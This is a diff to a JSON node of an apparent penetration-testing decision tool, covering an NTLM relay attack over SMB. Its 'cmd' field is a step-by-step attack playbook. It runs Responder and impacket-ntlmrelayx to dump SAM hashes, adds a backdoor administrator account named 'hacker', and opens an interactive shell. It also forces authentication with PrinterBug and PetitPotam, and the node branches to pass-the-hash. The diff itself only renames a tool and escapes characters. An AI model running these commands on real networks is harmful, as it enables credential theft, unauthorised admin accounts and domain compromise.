@@ -3,19 +3,19 @@
   "phase": "SMB",
   "title": "NTLM Relay Attack",
   "body": "SMB signing disabled = relay NTLMv2 hashes to other machines instead of cracking them. Requires at least two targets. ntlmrelayx does the heavy lifting.",
-  "cmd": "# ── PREREQUISITES ────────────────────────────────────\n# 1. SMB signing disabled on target (not required)\ncrackmapexec smb $ip/24 --gen-relay-list relay_targets.txt\ncat relay_targets.txt\n\n# ── STEP 1: CONFIGURE RESPONDER ──────────────────────\n# Turn OFF SMB and HTTP in responder (we relay, not capture)\nsudo nano /etc/responder/Responder.conf\n# Set: SMB = Off, HTTP = Off\nsudo responder -I tun0 -rdwv\n\n# ── STEP 2: START NTLMRELAYX ─────────────────────────\n# Basic relay — dumps SAM if admin\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n\n# With command execution (add admin user)\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net user hacker pass123! /add\"\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net localgroup administrators hacker /add\"\n\n# Interactive shell mode\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -i\n# Then: nc 127.0.0.1 <port shown>\n\n# Relay to LDAP (for AD attacks)\nimpacket-ntlmrelayx -t ldap://dc01 -smb2support --no-dump\n\n# ── STEP 3: TRIGGER AUTHENTICATION ───────────────────\n# Wait for user to connect to a UNC path\n# Or coerce via:\n# PrinterBug:\nimpacket-printerbug domain/user:pass@$ip $lhost\n# PetitPotam (no creds needed):\npython3 PetitPotam.py $lhost $ip\n\n# ── STEP 4: CHECK RESULTS ────────────────────────────\n# ntlmrelayx dumps SAM hashes if relay successful\n# Use dumped hashes for PTH",
+  "cmd": "# \u2500\u2500 PREREQUISITES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n# 1. SMB signing disabled on target (not required)\nnxc smb $ip/24 --gen-relay-list relay_targets.txt\ncat relay_targets.txt\n\n# \u2500\u2500 STEP 1: CONFIGURE RESPONDER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n# Turn OFF SMB and HTTP in responder (we relay, not capture)\nsudo nano /etc/responder/Responder.conf\n# Set: SMB = Off, HTTP = Off\nsudo responder -I tun0 -rdwv\n\n# \u2500\u2500 STEP 2: START NTLMRELAYX \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n# Basic relay \u2014 dumps SAM if admin\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n\n# With command execution (add admin user)\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net user hacker pass123! /add\"\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net localgroup administrators hacker /add\"\n\n# Interactive shell mode\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -i\n# Then: nc 127.0.0.1 <port shown>\n\n# Relay to LDAP (for AD attacks)\nimpacket-ntlmrelayx -t ldap://dc01 -smb2support --no-dump\n\n# \u2500\u2500 STEP 3: TRIGGER AUTHENTICATION \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n# Wait for user to connect to a UNC path\n# Or coerce via:\n# PrinterBug:\nimpacket-printerbug domain/user:pass@$ip $lhost\n# PetitPotam (no creds needed):\npython3 PetitPotam.py $lhost $ip\n\n# \u2500\u2500 STEP 4: CHECK RESULTS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n# ntlmrelayx dumps SAM hashes if relay successful\n# Use dumped hashes for PTH",
   "warn": "Both machines must have SMB signing disabled/not required. Cannot relay to the same machine the hash came from.",
   "choices": [
     {
-      "label": "Got SAM hashes — PTH",
+      "label": "Got SAM hashes \u2014 PTH",
       "next": "pth"
     },
     {
-      "label": "Command executed — got shell",
+      "label": "Command executed \u2014 got shell",
       "next": "windows_post_exploit"
     },
     {
-      "label": "Relay failed — crack hash instead",
+      "label": "Relay failed \u2014 crack hash instead",
       "next": "hashcrack"
     }
   ]
